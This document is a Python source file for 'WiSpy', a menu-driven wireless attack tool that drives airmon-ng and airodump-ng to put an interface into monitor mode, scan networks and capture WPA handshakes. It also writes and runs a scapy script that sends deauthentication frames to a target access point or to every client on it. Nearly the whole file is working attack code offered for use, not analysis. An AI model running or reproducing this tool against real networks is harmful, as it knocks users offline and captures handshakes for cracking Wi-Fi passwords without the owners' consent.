#!/usr/bin/env python3
"""
WiSpy  –  Wireless Recon & Attack Tool    (SnareKit module)
"""

import csv, os, re, signal, subprocess, time
from pathlib import Path
from colorama import Fore, Style, init

init(autoreset=True)


# ───────────────────────── Helper ─────────────────────────
def run_cmd(cmd: list[str]) -> str:
    """Run command & return stdout as text (quiet)."""
    return subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True)


def launch_in_terminal(cmd: str, title: str = "WiSpy"):
    """
    Launch `cmd` in new terminal, using available emulator.
    Supports QTerminal, GNOME Terminal, XTerm, etc.
    """
    terminals = {
        "qterminal": ["qterminal", "-e", cmd],
        "x-terminal-emulator": ["x-terminal-emulator", "-e", cmd],
        "gnome-terminal": ["gnome-terminal", "--", "bash", "-c", cmd],
        "xterm": ["xterm", "-e", cmd],
        "konsole": ["konsole", "-e", cmd],
    }

    for term, args in terminals.items():
        if shutil.which(term):
            try:
                subprocess.Popen(args)
                return
            except Exception as e:
                continue

    print(Fore.RED + "[!] No compatible terminal emulator found.")



# ───────────────────── Monitor-mode control ─────────────────────
def enable_monitor(iface: str):
    try:
        out = run_cmd(["airmon-ng", "start", iface])
        if "could cause trouble" in out:
            print(Fore.YELLOW + "[!] Killing NetworkManager & wpa_supplicant")
            subprocess.call(["airmon-ng", "check", "kill"])
            run_cmd(["airmon-ng", "start", iface])
        print(Fore.GREEN + f"[+] Monitor mode enabled on {iface}")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Failed: {e.output.strip()}")


def disable_monitor(iface: str):
    try:
        run_cmd(["airmon-ng", "stop", iface])
        subprocess.call(["service", "NetworkManager", "restart"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(Fore.GREEN + f"[+] Monitor mode disabled on {iface}")
    except subprocess.CalledProcessError:
        pass


def detect_monitor() -> str | None:
    try:
        iw = run_cmd(["iwconfig"])
        m = re.search(r"^(\w+).*Mode:Monitor", iw, re.M)
        return m.group(1) if m else None
    except subprocess.CalledProcessError:
        return None


# ───────────────────────── Actions ─────────────────────────
def passive_scan(m_iface: str):
    base = "/tmp/wispy_scan"
    cmd = f"airodump-ng -w {base} --output-format csv {m_iface}; bash"
    launch_in_terminal(cmd, "WiSpy Scan")


def capture_handshake(m_iface: str):
    bssid = input("BSSID of target AP: ").strip()
    channel = input("Channel: ").strip()
    if not bssid or not channel:
        print(Fore.RED + "[-] BSSID & channel required.")
        return
    name = f"handshake_{bssid.replace(':','')}"
    cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {name} {m_iface}; bash"
    launch_in_terminal(cmd, "WiSpy Handshake Capture")


def send_deauth(m_iface: str):
    ap = input("Target BSSID (AP MAC): ").strip()
    client = input("Client MAC (blank=broadcast): ").strip() or "ff:ff:ff:ff:ff:ff"
    count = input("Deauth packet count [50]: ").strip()
    count = int(count) if count.isdigit() else 50

    tmp_py = "/tmp/wispy_deauth.py"
    with open(tmp_py, "w") as f:
        f.write(f"""
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
frame = RadioTap()/Dot11(addr1='{client}', addr2='{ap}', addr3='{ap}')/Dot11Deauth(reason=7)
print('Sending {count} deauth frames...')
sendp(frame, iface='{m_iface}', count={count}, inter=0.1, verbose=1)
input('Done. Press Enter to close...')
""")
    launch_in_terminal(f"python3 {tmp_py}; rm {tmp_py}", "WiSpy Deauth")


# ───────────────────────── Main Menu ─────────────────────────
def run():
    iface = input("Wireless interface (e.g., wlan0): ").strip()
    while True:
        print(Style.BRIGHT + "\nWiSpy Menu")
        print("  1. Enable Monitor Mode")
        print("  2. Disable Monitor Mode")
        print("  3. Passive Scan (new terminal)")
        print("  4. Capture WPA Handshake (new terminal)")
        print("  5. Deauth Attack (new terminal)")
        print("  6. Exit")
        choice = input(">>> ").strip()

        if choice == "1":
            enable_monitor(iface)
        elif choice == "2":
            disable_monitor(iface)
        elif choice == "3":
            mon = detect_monitor()
            passive_scan(mon or iface)
        elif choice == "4":
            mon = detect_monitor()
            capture_handshake(mon or iface)
        elif choice == "5":
            mon = detect_monitor()
            send_deauth(mon or iface)
        elif choice == "6":
            break
        else:
            print("Invalid choice.")


if __name__ == "__main__":
    import shutil
    run()
